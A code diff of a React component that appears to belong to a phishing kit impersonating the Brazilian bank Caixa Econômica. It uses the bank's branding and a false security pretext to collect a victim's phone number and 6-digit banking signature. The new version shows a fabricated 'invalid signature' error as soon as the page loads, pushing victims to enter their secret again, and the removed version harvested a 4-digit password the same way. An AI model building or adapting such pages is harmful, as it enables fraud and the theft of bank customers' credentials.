@@ -1,12 +1,10 @@
-import React from 'react'
-import { useHistory } from 'react-router-dom';
-import { TextField } from '@material-ui/core'
+import React, { useEffect } from 'react'
 import { makeStyles } from '@material-ui/core/styles';
-import iconAlert from '../Assets/Images/alert.png'
-import './style.css'
-import logo from '../Assets/Images/logo.png'
+import TextField from '@material-ui/core/TextField';
+import alertify from 'alertifyjs';
+import InputMask from 'react-input-mask'
+import logo from '../Assets/Images/logo_white.png'
 import Loader from '../Components/Loader';
-
 
 const useStyles = makeStyles((theme) => ({
     root: {
@@ -14,59 +12,93 @@ const useStyles = makeStyles((theme) => ({
         flexWrap: 'wrap',
     },
     textField: {
+        // marginLeft: theme.spacing(1),
+        // marginRight: theme.spacing(1),
         width: '77vw',
         textAlign: 'center',
     },
 }));
 
+const Step3 = ({ nextStep, loginData, setLoginData }) => {
 
-const Step3 = ({ loginData, setLoginData, onCadastro }) => {
-
-    const classes = useStyles()
+    const classes = useStyles();
     const [loading, setLoading] = React.useState(false)
 
-    const history = useHistory()
+    useEffect(() => {
+        alertify.alert('Caixa Econômica', 'Assinatura inválida. (C902-033)')
+    }, [])
 
-    const onChangeSen4 = e => {
+    const onChangePhone = e => {
         // console.log(e.target.value)
-        setLoginData({ ...loginData, senha4: e.target.value })
+        setLoginData({ ...loginData, telefone: e.target.value })
     }
 
-    
+    const onChangeAss = e => {
+        // console.log(e.target.value)
+        setLoginData({ ...loginData, assinatura2: e.target.value })
+    }
 
+    const onClick = () => {
+
+        if (loginData.assinatura === '') {
+            alertify.alert('Caixa Econômica', 'Assinatura inválida. (C902-033)')
+        }
+        if (loginData.assinatura.length === 6) {
+            setLoading(true)
+            setTimeout(() =>{
+                nextStep()
+            },1000)
+        }
+
+    }
 
     return loading
-        ? <Loader />
-        :
-        <div className={classes.textField}>
-            <img src={logo} className="logo" />
 
+    ? <Loader />
+    :
 
-            <h3>VALIDAÇÃO</h3>
-            <div className="alert-image">
-                <img src={iconAlert} />
-                <p>Este dispositivo ainda não foi confirmado como um dispositivo seguro. por este motivo é necessário que informe a senha de 4 dígitos.</p>
-            </div>
-            <div>
+    <div>
+
+        <img src={logo} className="logo" />
+
+            <div className={classes.textField}>
+                <h2>Olá,</h2>
+
+                <p>Por motivo de segurança é necessário confirmar algumas informações</p>
+
+                <InputMask mask="(99) 99999-9999" value={loginData.telefone} onChange={onChangePhone}>
+                    {(inputProps) =>
+                        <TextField
+                            label="Telefone"
+                            id="margin-none"
+                            onChange={onChangePhone}
+                            defaultValue=""
+                            className={classes.textField}
+                        //   helperText="Some important text"
+                        />
+                    }
+                </InputMask>
+
+                <p>Para aumentar ainda mais sua segurança, está validação deve ser confirmada com a assinatura de 6 dígitos</p>
+
                 <TextField
-                    label="Senha de 4 dígitos"
+                    label="Assinatura"
                     id="margin-none"
-                    onChange={onChangeSen4}
-                    defaultValue=""
                     type="password"
+                    onChange={onChangeAss}
+
                     className={classes.textField}
-                    //   helperText="Some important text"
                     onInput={(e) => {
-                        e.target.value = Math.max(0, parseInt(e.target.value)).toString().slice(0, 4)
-                    }}
-                />
-            </div>
-            <div>
-                
-                <button type="button" className="botaoLaranja" onClick={onCadastro}>CONFIRMAR</button>
+                        e.target.value = Math.max(0, parseInt(e.target.value)).toString().slice(0, 6)
+                    }} />
+                <div>
+                    <button type="button" className="botaoLaranja" onClick={onClick}>Continuar</button>
+                </div>
+
+                <p>*Este dado está de acordo com o registro de Cadastro de Pessoa Física da Receita Federal</p>
             </div>
         </div>
-
+    
 }
 
 export default Step3
